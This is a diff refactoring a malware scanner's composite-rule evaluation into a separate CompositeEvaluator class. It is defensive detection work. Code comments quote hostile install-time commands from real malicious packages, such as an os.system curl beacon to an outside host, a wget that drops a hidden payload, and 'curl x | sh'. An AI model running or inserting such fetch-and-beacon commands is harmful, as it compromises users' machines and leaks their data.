@@ -27,8 +27,6 @@ from __future__ import annotations
 
 import ast
 import re
-from collections import Counter
-from contextlib import suppress
 from dataclasses import replace
 from typing import TYPE_CHECKING, ClassVar
 
@@ -48,7 +46,8 @@ from cordon_scanner.detect.base import (
     ScanContext,
 )
 from cordon_scanner.detect.code.capability.build_output import BuildOutput
-from cordon_scanner.detect.code.capability.hits import CapabilityHit, LineRanges
+from cordon_scanner.detect.code.capability.composites import CompositeEvaluator
+from cordon_scanner.detect.code.capability.hits import CapabilityHit
 from cordon_scanner.detect.code.capability.javascript import JavaScriptCapabilities
 from cordon_scanner.detect.code.capability.labelling import Labelling
 from cordon_scanner.detect.code.capability.load_path import LoadPath
@@ -988,13 +987,18 @@ class CapabilityDetector(BaseDetector):
         )
 
     def _suspect_dropper_reports(
-        self, ctx: ScanContext, path: str, hits: list[CapabilityHit], rule: str = DROPPER_RULE
+        self,
+        evaluator: CompositeEvaluator,
+        ctx: ScanContext,
+        path: str,
+        hits: list[CapabilityHit],
+        rule: str = DROPPER_RULE,
     ) -> bool:
         """Whether the suspect grade (`SUSPECT.DROPPER.001`) fires on the window its malware grade
         matched: its `unless` excludes test paths, and withdrawing the one where the other does
         not report would leave the file clean."""
         suspect, fired = ctx.rules.get(rule), frozenset(hit.rule_id for hit in hits)
-        return suspect is not None and self._evaluate(
+        return suspect is not None and evaluator.evaluate(
             suspect, {hit.capability for hit in hits}, path, in_hook=True, fired=fired
         )
 
@@ -1045,24 +1049,6 @@ class CapabilityDetector(BaseDetector):
     """Go's `func init()`, Java's `static { ... }`, a C# static constructor, a C/C++
     `__attribute__((constructor))` and Rust's `#[ctor]`: code that runs when the package is imported,
     the class is loaded or the library is mapped -- how malicious modules run their payload."""
-
-    @staticmethod
-    def _satisfying_region(content: FileContent, hits: list[CapabilityHit]) -> bytes:
-        """The bytes the composite actually matched across, plus a margin.
-
-        A window around the ANCHOR is the wrong region to look in. The anchor is one
-        of several hits and not necessarily the fetch: in Elasticsearch's
-        `setup_node.sh` the anchor landed 400 bytes away from the `curl`, so the pin in
-        the URL was outside the window and the file was still called malware.
-
-        The composite matched because a SET of hits sat close enough together, so that
-        set is the region any statement about the match has to be made over.
-        """
-        if not hits:
-            return b""
-        start = min(hit.byte_start for hit in hits)
-        end = max(hit.byte_end for hit in hits)
-        return content.raw[max(0, start - 200) : end + 200]
 
     #: A fetch whose target is identified by something immutable.
     #:
@@ -1127,16 +1113,17 @@ class CapabilityDetector(BaseDetector):
         # The AST tier is excluded. It is a second view of the same call --
         # resolving what a pattern could not see, not finding another decode --
         # so counting it too would make every parsed Python file appear to
-        # decode twice. That reasoning lives in `_evaluate_over`, which is
+        # decode twice. That reasoning lives in `CompositeEvaluator._evaluate_over`, which is
         # where the counting now happens, because a composite with a proximity
         # counts what is inside its window rather than what is in the file.
         in_hook = ctx.in_install_hook(unit.path)
         in_ci = ctx.in_ci_hook(unit.path)
         in_consumer = ctx.in_consumer_install(unit.path)
-        # Read by the `install_entry` term. Composites are evaluated one file at a time.
-        self._in_entry = unit.path in ctx.install_entry_paths
-        # A published package's own entry point, run on `require()`/`import` (REC-2).
-        self._in_import_entry = unit.path in ctx.import_entry_paths
+        # Read by the `install_entry` and `import_entry` terms; the evaluator is this file's own.
+        evaluator = CompositeEvaluator(
+            in_entry=unit.path in ctx.install_entry_paths,
+            in_import_entry=unit.path in ctx.import_entry_paths,
+        )
         # Install-time context is decided per WINDOW, not per file. A file is in
         # the closure because a hook imports it, and importing a module defines
         # its functions without calling them -- so a pair of capabilities inside
@@ -1169,17 +1156,17 @@ class CapabilityDetector(BaseDetector):
                 else DecodeRun.hits_for(compiled.rule.id, hits, decode_excused)
             )
             if compiled.rule.id in self.CONTEXT_FREE:
-                window = self._satisfying_window(
+                window = evaluator.satisfying_window(
                     compiled, rule_hits, unit.path, False, False, False, frozenset()
                 )
             else:
-                window = self._satisfying_window(
+                window = evaluator.satisfying_window(
                     compiled, rule_hits, unit.path, in_hook, in_ci, in_consumer, deferred
                 )
             if window is None:
                 continue
 
-            matched_capabilities = self._capabilities_of(compiled)
+            matched_capabilities = CompositeEvaluator.capabilities_of(compiled)
             if Capability.EGRESS in matched_capabilities and (
                 (
                     Capability.CREDENTIAL in matched_capabilities
@@ -1207,7 +1194,7 @@ class CapabilityDetector(BaseDetector):
             anchor = self._anchor(matched, local_by_capability, window)
 
             finding = self._composite_finding(
-                compiled, unit, ctx, anchor, matched, window, file_hits=hits
+                compiled, unit, ctx, anchor, matched, window, file_hits=hits, evaluator=evaluator
             )
             if finding is not None:
                 yield finding
@@ -1267,7 +1254,6 @@ class CapabilityDetector(BaseDetector):
         name = read.group("dotted") or read.group("quoted") or ""
         return not any(pattern.match(name) for pattern, _ in CREDENTIAL_HOMES)
 
-    BYTES_PER_LINE = 200
     """How far apart in bytes `proximity` lines are allowed to be.
 
     Proximity is a line count, and a minifier deletes lines. On a bundle the
@@ -1285,441 +1271,13 @@ class CapabilityDetector(BaseDetector):
     nearer forty, so this never narrows a window on code somebody wrote by hand.
     What it does is stop a window from spanning a bundle."""
 
-    MAX_PROXIMITY_HITS = 400
-    """Above this many capability hits, the pairwise search gives way to `_dense_window`.
+    """Above this many capability hits, the pairwise search gives way to `CompositeEvaluator._dense_window`.
 
     The search is quadratic in the number of hits, and a file with four hundred of them is
     generated or enormous. It used to fall back to file scope there -- reporting more, on the
     theory that more is safe -- which made every large bundle a single window."""
 
-    def _satisfying_window(
-        self,
-        compiled: CompiledRule,
-        hits: list[CapabilityHit],
-        path: str,
-        in_hook: bool,
-        in_ci: bool,
-        in_consumer: bool = False,
-        deferred: frozenset[tuple[int, int]] = frozenset(),
-    ) -> list[CapabilityHit] | None:
-        """The hits that satisfy this composite, or `None` if none do.
-
-        With no `proximity` the window is the whole file, which is what every
-        composite meant before proximity existed. With one, the capabilities
-        must appear within that many lines of each other -- so a claim that a
-        file fetches and executes becomes a claim that one *part* of it does,
-        which is what the message has always said.
-        """
-        proximity = compiled.match.proximity
-        if (
-            proximity > 0
-            and in_hook
-            and hits
-            and (
-                max(h.line for h in hits) <= self.SMALL_HOOK_LINES
-                # Lines of ordinary length: a minified bundle's 300 lines are a whole library.
-                and max(h.byte_start for h in hits) <= 160 * self.SMALL_HOOK_LINES
-                # And written by hand: an editor extension's compiled entry is a bundle whose
-                # first hundred lines hold unrelated libraries (review 98: about twenty Open VSX
-                # AI-coding extensions read as one install-time act).
-                and not BuildOutput.bundled_path(path)
-            )
-        ):
-            # An install script a few hundred lines long runs top to bottom, and its parts are one
-            # act: `@testcarrot/supply6` reads the username in one function and writes it to a raw
-            # socket from another 25 lines below, past a 30-line window (review 98). Proximity
-            # separates the halves of a library; it does not separate the halves of a hook.
-            proximity = 0
-        if proximity <= 0:
-            if self._evaluate_over(
-                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
-            ):
-                return hits
-            return None
-        if len(hits) > self.MAX_PROXIMITY_HITS:
-            return self._dense_window(
-                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, proximity
-            )
-
-        # Sorted by line ALONE, and stably. Adding `byte_start` to the key looks
-        # harmless and is not: a window is `ordered[index:]`, so it drops every
-        # hit that sorts earlier, and the AST tier's `fixed` marker sits on the
-        # same line as the pattern hit it qualifies. Reordering the two put the
-        # marker behind the window, `fixed_lines` came out empty, and
-        # `subprocess.run(["git", "rev-parse", "HEAD"])` -- an argv written out
-        # in full -- satisfied `SUSPECT.DECODE_EXEC.001` again. The existing
-        # test for it is what caught this.
-        ordered = sorted(hits, key=lambda h: h.line)
-        byte_limit = proximity * self.BYTES_PER_LINE
-        for index, first in enumerate(ordered):
-            limit = first.line + proximity
-            window = [
-                h
-                for h in ordered[index:]
-                if h.line <= limit and abs(h.byte_start - first.byte_start) <= byte_limit
-            ]
-            if self._evaluate_over(
-                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
-            ):
-                return window
-        return None
-
-    SMALL_HOOK_LINES: ClassVar[int] = 300
     """Install-time code whose every capability sits within this many lines is one window."""
-
-    def _dense_window(
-        self,
-        compiled: CompiledRule,
-        hits: list[CapabilityHit],
-        path: str,
-        in_hook: bool,
-        in_ci: bool,
-        in_consumer: bool,
-        deferred: frozenset[tuple[int, int]],
-        proximity: int,
-    ) -> list[CapabilityHit] | None:
-        """Proximity over a file with more hits than the pairwise search affords.
-
-        The file used to be one window past `MAX_PROXIMITY_HITS`, which in a bundle means any
-        credential read and any request anywhere in ten megabytes are "together": a 27 MB agent
-        extension's secret-redaction table (`hooks.slack.com/<redacted>`) and its help text
-        (`"Read(~/.zshrc)"`) were blocked as malware (review 98). Here each hit is the centre of
-        the bytes within `proximity * BYTES_PER_LINE` either side, found by bisection over the
-        hits sorted by offset -- symmetric, so a marker that sorts just before its pattern hit is
-        still in the window -- and a window identical to the last is not evaluated twice.
-        """
-        import bisect
-
-        byte_limit = proximity * self.BYTES_PER_LINE
-        by_byte = sorted(hits, key=lambda h: h.byte_start)
-        starts = [h.byte_start for h in by_byte]
-        last: tuple[int, int] | None = None
-        for centre in by_byte:
-            lo = bisect.bisect_left(starts, centre.byte_start - byte_limit)
-            hi = bisect.bisect_right(starts, centre.byte_start + byte_limit)
-            if (lo, hi) == last:
-                continue
-            last = (lo, hi)
-            window = [h for h in by_byte[lo:hi] if abs(h.line - centre.line) <= proximity]
-            if self._evaluate_over(
-                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
-            ):
-                return window
-        return None
-
-    def _evaluate_over(
-        self,
-        compiled: CompiledRule,
-        window: list[CapabilityHit],
-        path: str,
-        in_hook: bool,
-        in_ci: bool,
-        in_consumer: bool = False,
-        deferred: frozenset[tuple[int, int]] = frozenset(),
-        *,
-        all_hits: list[CapabilityHit] | None = None,
-    ) -> bool:
-        all_hits = window if all_hits is None else all_hits
-        # A spawn whose whole argv is written out in the source does not count.
-        #
-        # Every composite that names `spawn` uses it as evidence that something
-        # unknown runs -- decoded data, a downloaded file, a credential's worth of
-        # harvested output. `subprocess.run(["git", "rev-parse", "--short", "HEAD"])`
-        # cannot be any of those: what it runs is in the file, in front of the
-        # reader.
-        #
-        # `NousResearch/hermes-agent` produced eleven `SUSPECT.DECODE_EXEC.001`
-        # anchored on exactly that shape -- `["ldd", "--version"]`, `["launchctl",
-        # "list", label]`, `["git", "rev-parse"]` -- each paired with a base64
-        # decode somewhere else in the file. Across the corpus `SUSPECT.DECODE_EXEC
-        # .001` was 684 findings in 252 of 1,487 repositories.
-        #
-        # What keeps the real cases is that a constant argv is ANALYSED rather than
-        # trusted: `os.system("curl x | sh")` is constant too, and the embedded-shell
-        # tier extracts the fetch and the pipe from it as capabilities of their own,
-        # which satisfy the composite on their own terms. And a constant command
-        # naming a temporary or relative path is not treated as fixed at all, because
-        # that is where a dropper puts its payload.
-        # By LINE, not by hit. The pattern tier and the AST tier both see the same
-        # call -- `CAP.PY.SPAWN.001@222` and `AST.PY.SPAWN@222` -- and only the AST
-        # tier can say whether the argv was written out, so dropping its own hit
-        # alone left the pattern tier's to satisfy the term anyway.
-        # Unless the argv that was written out is ITSELF the act. The discount rests
-        # on one claim -- that a spawn whose whole command is visible cannot be
-        # running something decoded or downloaded -- and that claim holds for
-        # `subprocess.run(["git", "rev-parse", "--short", "HEAD"])` and fails
-        # completely for `os.system("curl https://kotko.me/analyze.php?procoder")`.
-        # Both are fully literal. In the second the literal is the attack, and being
-        # readable is not the same as being harmless.
-        #
-        # So a line whose command carried a capability of its own keeps its spawn.
-        # `CAP.SH.*` is the marker for that: those hits exist only because the shell
-        # rules were applied to the command string a spawn was handed, so one on this
-        # line means the argv itself fetches, decodes or persists.
-        #
-        # Measured. `procoder`'s `setup.py` is `os.system("curl <url>")` and nothing
-        # else; the spawn was discounted, only `egress` survived, and
-        # `MALWARE.DROPPER.001` needs both -- so an install-time beacon in four lines
-        # of Python produced no finding. Six of the packages still missed after the
-        # reconnaissance work were this shape, `duc193`'s
-        # `os.system("wget -O ~/.mal/.neofetch.py <url>")` among them.
-        #
-        # Computed over every hit in the FILE rather than over the window, and
-        # that is load-bearing rather than tidy. "This line's argv is written
-        # out in full" is a fact about the line; which window happens to be
-        # under evaluation cannot change it. Scoping it to the window made the
-        # discount depend on hit ORDER, because a window is `ordered[index:]`
-        # and drops everything sorting earlier -- so a window starting at a
-        # spawn hit that sorted after the `fixed` marker on the same line
-        # contained no marker at all, `fixed_lines` came out empty, and the
-        # discount silently did not apply.
-        #
-        # This is the second time that shape has bitten. The comment on
-        # `ordered` records the first: adding `byte_start` to the sort key
-        # reordered the marker behind the window and `subprocess.run(["git",
-        # "rev-parse", "--short", "HEAD"])` satisfied `SUSPECT.DECODE_EXEC.001`
-        # again. It was fixed by preserving the order, which left the real
-        # fragility in place -- appending any new spawn-labelling tier after
-        # the marker reproduced it exactly, and adding the `ast` match kind
-        # did. Taking the fact from the file removes the ordering dependency
-        # instead of restating the rule that protects it.
-        speaking_argv = {
-            hit.line
-            for hit in all_hits
-            if hit.rule_id.startswith("CAP.SH.") and hit.capability is not Capability.SPAWN
-        }
-        fixed_lines = {hit.line for hit in all_hits if hit.fixed} - speaking_argv
-        window = [
-            hit
-            for hit in window
-            if not (hit.capability is Capability.SPAWN and hit.line in fixed_lines)
-        ]
-        # The file runs at install time; this window has to as well. If any hit
-        # in it sits in a body the hooks never call, the pair the composite
-        # describes is not something that happens during an install -- so the
-        # `context: install_hook` term is not satisfied for THIS window, even
-        # though it is for the file.
-        #
-        # `any` rather than `all`: the claim is that these capabilities occur
-        # together during an install, and one half of the pair sitting in dead
-        # code is enough for that not to be true.
-        if in_hook and deferred and any(LineRanges.cls_in(hit.line, deferred) for hit in window):
-            in_hook = False
-
-        present = {hit.capability for hit in window}
-        counts: Counter[Capability] = Counter()
-        for hit in window:
-            if not hit.resolved:
-                counts[hit.capability] += hit.variants
-        fired = frozenset(hit.rule_id for hit in window)
-        return self._evaluate(compiled, present, path, in_hook, counts, fired, in_ci, in_consumer)
-
-    def _evaluate(
-        self,
-        compiled: CompiledRule,
-        present: set[Capability],
-        path: str,
-        in_hook: bool = False,
-        counts: Counter[Capability] | None = None,
-        fired: frozenset[str] = frozenset(),
-        in_ci: bool = False,
-        in_consumer: bool = False,
-    ) -> bool:
-        """Evaluate a composite expression against the capabilities present.
-
-        Supports ``all``, ``any``, nested combinations, and ``unless``. Kept
-        deliberately small: a composite rule is read by somebody deciding whether
-        a security finding is justified, and an expression language rich enough
-        to be clever is one nobody can review.
-        """
-        match = compiled.match
-        counts = counts if counts is not None else Counter(present)
-
-        if match.all_of and not all(
-            self._term(
-                term,
-                present,
-                path=path,
-                in_hook=in_hook,
-                in_ci=in_ci,
-                in_consumer=in_consumer,
-                counts=counts,
-                fired=fired,
-            )
-            for term in match.all_of
-        ):
-            return False
-        if match.any_of and not any(
-            self._term(
-                term,
-                present,
-                path=path,
-                in_hook=in_hook,
-                in_ci=in_ci,
-                in_consumer=in_consumer,
-                counts=counts,
-                fired=fired,
-            )
-            for term in match.any_of
-        ):
-            return False
-        return not any(
-            self._term(
-                term,
-                present,
-                path=path,
-                in_hook=in_hook,
-                in_ci=in_ci,
-                in_consumer=in_consumer,
-                counts=counts,
-                fired=fired,
-            )
-            for term in match.unless
-        )
-
-    def _term(
-        self,
-        term: object,
-        present: set[Capability],
-        *,
-        path: str | None = None,
-        in_hook: bool = False,
-        in_ci: bool = False,
-        in_consumer: bool = False,
-        counts: Counter[Capability] | None = None,
-        fired: frozenset[str] = frozenset(),
-    ) -> bool:
-        if not isinstance(term, dict):
-            return False
-
-        if "capability" in term:
-            try:
-                capability = Capability(str(term["capability"]))
-            except ValueError:
-                return False
-            required = term.get("at_least")
-            if required is None:
-                return capability in present
-            # Depth, not presence. `decode` twice in one file is a decode
-            # chain -- base64 into decompress into execute -- and that is a
-            # stronger claim than decoding once, because a single decode has
-            # ordinary uses and stacking them has none.
-            observed = (counts or Counter(present))[capability]
-            return observed >= int(required)
-
-        # A named indicator rather than a capability.
-        #
-        # Some evidence is not a behaviour, it is a destination: posting to a
-        # Discord webhook and posting to a metrics endpoint are both `egress`,
-        # and the capability model deliberately cannot tell them apart. This
-        # term lets a composite say "that specific rule fired" without
-        # inventing a capability for every indicator, which is what would
-        # otherwise happen and would dilute the primitives until they meant
-        # nothing.
-        if "rule" in term:
-            return str(term["rule"]) in fired
-
-        if "any" in term:
-            return any(
-                self._term(
-                    t,
-                    present,
-                    path=path,
-                    in_hook=in_hook,
-                    in_ci=in_ci,
-                    in_consumer=in_consumer,
-                    counts=counts,
-                    fired=fired,
-                )
-                for t in term["any"] or ()
-            )
-
-        if "all" in term:
-            return all(
-                self._term(
-                    t,
-                    present,
-                    path=path,
-                    in_hook=in_hook,
-                    in_ci=in_ci,
-                    in_consumer=in_consumer,
-                    counts=counts,
-                    fired=fired,
-                )
-                for t in term["all"] or ()
-            )
-
-        # The negation of a term.
-        #
-        # `unless` already refuses a composite by path, and that is the only
-        # thing this model could say "not" about. The case that needed more:
-        # `SUSPECT.DECODE_EXEC.001` pairs a decode with a process start, and in
-        # shell every command is a process -- so `key=$(echo "$b" | base64 -d)`,
-        # which is how a shell script decodes anything at all, matched a rule
-        # whose message says the decoded value was executed. The primitive is
-        # right and it is not evidence of that claim in that one language, which
-        # is a statement about a specific capability rule rather than about a
-        # path or a context.
-        if "not" in term:
-            return not self._term(
-                term["not"],
-                present,
-                path=path,
-                in_hook=in_hook,
-                in_ci=in_ci,
-                in_consumer=in_consumer,
-                counts=counts,
-                fired=fired,
-            )
-
-        if "path_glob" in term and path is not None:
-            from cordon_scanner.foundation.files.globs import PathGlob
-
-            entry = getattr(self, "_in_entry", False) or getattr(self, "_in_import_entry", False)
-            return not entry and PathGlob.in_package(path, str(term["path_glob"]))
-
-        # Execution context as a first-class term.
-        #
-        # This is what lets a rule say "credential access plus network egress,
-        # in an install hook" without also requiring an execution primitive. In
-        # application code that pairing needs a third signal to be meaningful,
-        # because reading configuration and calling an API is what an
-        # application does all day. In an install hook it does not: the hook IS
-        # the execution, so the pair alone is already the whole attack.
-        if "context" in term:
-            named = str(term["context"])
-            if named == "install_hook":
-                return in_hook
-            if named == "ci_hook":
-                return in_ci
-            if named == "consumer_install":
-                return in_consumer
-            if named == "install_entry":
-                return in_hook and getattr(self, "_in_entry", False)
-            if named == "import_entry":
-                return getattr(self, "_in_import_entry", False)
-            return False
-
-        return False
-
-    @staticmethod
-    def _capabilities_of(compiled: CompiledRule) -> tuple[Capability, ...]:
-        """Every capability named anywhere in a composite expression."""
-        found: list[Capability] = []
-
-        def walk(term: object) -> None:
-            if not isinstance(term, dict):
-                return
-            if "capability" in term:
-                with suppress(ValueError):
-                    found.append(Capability(str(term["capability"])))
-            for key in ("all", "any"):
-                for nested in term.get(key) or ():
-                    walk(nested)
-
-        for term in (*compiled.match.all_of, *compiled.match.any_of):
-            walk(term)
-        return tuple(dict.fromkeys(found))
 
     #: How much of the finding each capability carries, most specific first.
     #: A compound primitive names the whole act by itself -- `fetch_exec` IS
@@ -1995,6 +1553,7 @@ class CapabilityDetector(BaseDetector):
         hits: list[CapabilityHit],
         *,
         file_hits: list[CapabilityHit] | None = None,
+        evaluator: CompositeEvaluator,
     ) -> Finding | None:
         rule = compiled.rule
         content = unit.content
@@ -2124,7 +1683,7 @@ class CapabilityDetector(BaseDetector):
             verified
             and compiled.rule.id in self.WITHDRAWN_WHEN_VERIFIED
             and self._suspect_dropper_reports(
-                ctx, content.path, hits, self.WITHDRAWN_WHEN_VERIFIED[compiled.rule.id]
+                evaluator, ctx, content.path, hits, self.WITHDRAWN_WHEN_VERIFIED[compiled.rule.id]
             )
         ):
             # Withdrawn for the reason above, and only where `SUSPECT.DROPPER.001` reports the same
@@ -2136,7 +1695,7 @@ class CapabilityDetector(BaseDetector):
             return None
 
         if rule.id == "MALWARE.EXFIL.BEACON.001" and CapabilityDetector._loopback_only(
-            CapabilityDetector._satisfying_region(content, hits)
+            CompositeEvaluator.satisfying_region(content, hits)
         ):
             # A daemon's health check on its own port: what reaches 127.0.0.1 never leaves the
             # machine, so it carries nothing anywhere (review 98, FP-3: aigentry-telepty). Any
@@ -2178,7 +1737,7 @@ class CapabilityDetector(BaseDetector):
             and not in_hook
             and ctx.in_ci_hook(content.path)
             and CapabilityDetector.PINNED_FETCH.search(
-                CapabilityDetector._satisfying_region(content, hits)
+                CompositeEvaluator.satisfying_region(content, hits)
             )
         ):
             return None
